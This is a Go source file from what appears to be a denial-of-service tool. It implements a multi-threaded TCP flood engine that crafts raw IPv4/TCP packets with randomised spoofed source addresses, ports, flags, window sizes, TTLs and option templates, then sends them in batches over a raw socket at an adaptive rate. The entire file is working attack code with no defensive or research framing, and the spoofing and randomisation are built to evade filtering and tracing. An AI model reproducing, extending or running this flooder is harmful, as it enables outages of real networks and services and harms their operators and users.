//go:build linux

package core

import (
	"byter/utils"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"syscall"
	"time"
)

var tcpOptTemplates = [][]byte{
	{2, 4, 0x05, 0xb4},
	{2, 4, 0x05, 0xb4, 4, 2},
	{2, 4, 0x05, 0xb4, 3, 3, 7, 1, 1, 8, 10, 0, 0, 0, 0, 0},
	{1},
	{1, 1, 4, 2},
}

func L4State(st *EngineState, stop <-chan struct{}) error {
	cfg := st.L4
	target := cfg.Target
	if target == "" {
		target = st.Global.Target
	}
	port := cfg.Port
	if port == 0 {
		port = st.Global.Port
	}
	rate := cfg.Rate
	if rate == 0 {
		rate = st.Global.Rate
	}
	threads := cfg.Threads
	if threads == 0 {
		threads = st.Global.Threads
	}
	flood := cfg.Flood
	if flood == 0 && st.Global.Flood != 0 {
		flood = st.Global.Flood
	}
	window := cfg.Window
	if window == 0 {
		window = 65535
	}
	flags := cfg.Flags
	if len(flags) == 0 {
		flags = []string{"ACK", "FIN"}
	}
	batch := cfg.BatchSize
	if batch < 1 {
		batch = 256
	}

	dst := net.ParseIP(target).To4()
	if dst == nil {
		return fmt.Errorf("target không hợp lệ: %s", target)
	}
	dst4 := utils.AddrTo4(dst)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)

	fmt.Printf("[L4] -> %s:%d | threads=%d rate=%d flood=%s flags=%v batch=%d\n",
		target, port, threads, rate, flood, flags, batch)

	var wg sync.WaitGroup
	for t := 0; t < threads; t++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l4WorkerBatch(st, &addr, dst4, uint16(port), flood, rate, uint16(window), flags, cfg.SpoofSeq, batch, stop)
		}()
	}

	<-stop
	wg.Wait()
	return nil
}

func l4WorkerBatch(st *EngineState, addr *syscall.SockaddrInet4, dst4 [4]byte, dport uint16, flood FloodMode, rate int, window uint16, flags []string, spoofSeq bool, batch int, stop <-chan struct{}) {
	rl := NewRateLimiter(flood, rate)
	lastAdapt := time.Now()

	baseSrc := randomSrcIP()
	src4 := utils.AddrTo4(baseSrc)
	baseSeq := rand.Uint32()
	flagByte := utils.FlagsToByte(flags)
	if flagByte == 0 {
		flagByte = utils.TCP_ACK
	}
	optTemplate := tcpOptTemplates[rand.Intn(len(tcpOptTemplates))]

	pkts := make([][]byte, batch)
	for i := range pkts {
		pkts[i] = make([]byte, 128)
	}

	for {
		select {
		case <-stop:
			return
		default:
		}

		for i := 0; i < batch; i++ {
			srcPort := utils.RandomSrcPort()
			seq := baseSeq + uint32(rand.Intn(0x4000))
			if !spoofSeq {
				seq = 0
			}
			curFlags := flagByte
			if rand.Intn(100) < 20 {
				curFlags = randomTCPFlags()
			}
			curWin := window
			if rand.Intn(10) == 0 {
				curWin = uint16(rand.Intn(65535))
			}
			ttl := uint8(48 + rand.Intn(80))

			buildL4Packet(pkts[i], src4, dst4, srcPort, dport, seq, curFlags, curWin, ttl, optTemplate)
		}

		n := utils.SendBatch(st.RawFD, pkts, addr)
		if n > 0 {
			st.Counters.IncSuccess(n * 60)
		} else {
			st.Counters.IncFail()
		}

		if flood == FloodAdaptive && time.Since(lastAdapt) > time.Second {
			rl.Adapt(st.Counters)
			lastAdapt = time.Now()
		}
		rl.Wait()
	}
}

func buildL4Packet(buf []byte, src4, dst4 [4]byte, srcPort, dport uint16, seq uint32, flags uint8, window uint16, ttl uint8, optTemplate []byte) int {
	dataOff := uint8(5)
	tcpLen := 20
	if len(optTemplate) > 0 && len(optTemplate)%4 == 0 {
		dataOff = 5 + uint8(len(optTemplate)/4)
		tcpLen = 20 + len(optTemplate)
	}
	total := 20 + tcpLen

	off := 20
	binary.BigEndian.PutUint16(buf[off:], srcPort)
	binary.BigEndian.PutUint16(buf[off+2:], dport)
	binary.BigEndian.PutUint32(buf[off+4:], seq)
	binary.BigEndian.PutUint32(buf[off+8:], 0)
	buf[off+12] = dataOff << 4
	buf[off+13] = flags
	binary.BigEndian.PutUint16(buf[off+14:], window)
	binary.BigEndian.PutUint16(buf[off+16:], 0)
	binary.BigEndian.PutUint16(buf[off+18:], 0)
	if dataOff > 5 {
		copy(buf[off+20:off+20+len(optTemplate)], optTemplate)
	}

	var pseudo [12]byte
	copy(pseudo[0:4], src4[:])
	copy(pseudo[4:8], dst4[:])
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:], uint16(tcpLen))
	sum := ipChecksumPseudo(pseudo[:], buf[off:off+tcpLen])
	binary.BigEndian.PutUint16(buf[off+16:], sum)

	buf[0] = 0x45
	buf[1] = 0
	binary.BigEndian.PutUint16(buf[2:], uint16(total))
	binary.BigEndian.PutUint16(buf[4:], utils.RandomIPID())
	binary.BigEndian.PutUint16(buf[6:], 0)
	buf[8] = ttl
	buf[9] = 6
	binary.BigEndian.PutUint16(buf[10:], 0)
	copy(buf[12:16], src4[:])
	copy(buf[16:20], dst4[:])
	binary.BigEndian.PutUint16(buf[10:], utils.IPChecksum(buf[:20]))
	return total
}

func randomTCPFlags() uint8 {
	pool := []uint8{
		utils.TCP_ACK,
		utils.TCP_ACK | utils.TCP_PSH,
		utils.TCP_ACK | utils.TCP_FIN,
		utils.TCP_SYN,
		utils.TCP_RST,
		utils.TCP_ACK | utils.TCP_URG,
		utils.TCP_FIN | utils.TCP_PSH,
	}
	return pool[rand.Intn(len(pool))]
}

func ipChecksumPseudo(pseudo, tcp []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(pseudo); i += 2 {
		sum += uint32(pseudo[i])<<8 | uint32(pseudo[i+1])
	}
	for i := 0; i+1 < len(tcp); i += 2 {
		sum += uint32(tcp[i])<<8 | uint32(tcp[i+1])
	}
	if len(tcp)%2 == 1 {
		sum += uint32(tcp[len(tcp)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}